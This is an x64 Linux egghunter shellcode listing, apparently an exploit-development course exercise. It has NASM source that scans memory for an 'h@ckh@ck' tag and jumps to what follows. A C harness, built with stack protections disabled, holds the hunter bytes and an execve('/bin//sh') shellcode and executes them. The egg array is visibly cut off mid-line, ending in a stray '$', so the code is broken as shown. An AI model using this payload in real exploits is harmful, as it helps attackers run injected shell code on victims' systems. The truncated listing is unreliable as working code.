/*
;Title:            x64 Linux egghunter in 24 bytes
;Author:           David Velázquez a.k.a d4sh&r
;Contact:          https://mx.linkedin.com/in/d4v1dvc
;Description:      x64 Linux egghunter that looks for the string "h@ckh@ck"
;                  and then execute the shellcode
;Tested On:        Linux kali64 3.18.0-kali3-amd64 x86_64 GNU/Linux

;Compile & Run:    nasm -f elf64 -o egghunter.o egghunter.nasm
;                  ld -o egghunter egghunter.o
;SLAE64-1379

global _start

_start:
    pop rax  ; some address in the stack
search:
        inc rax
        cmp [rax - 4] , dword 0x6b634068 ; "h@ck"
jnz search
        cmp [rax - 8] , dword 0x6b634068 ; "h@ck"
jnz search
        call  rax   ; execute shellcode
*/
#include<stdio.h>
#include<string.h>
//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
unsigned char hunter[] = "\x58\x48\xff\xc0\x81\x78\xfc\x68\x40\x63\x6b\x75\xf4\x81\x78\xf8\x68\x40\x63\x6b\x75\xeb\xff\xd0";
unsigned char egg[] = \
"\x68\x40\x63\x6b"  //egg
"\x68\x40\x63\x6b"  //egg
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x0$

int main()

{

        printf("Hunter Length:  %d\n", (int)strlen(hunter));

        (*(void  (*)()) hunter)();

}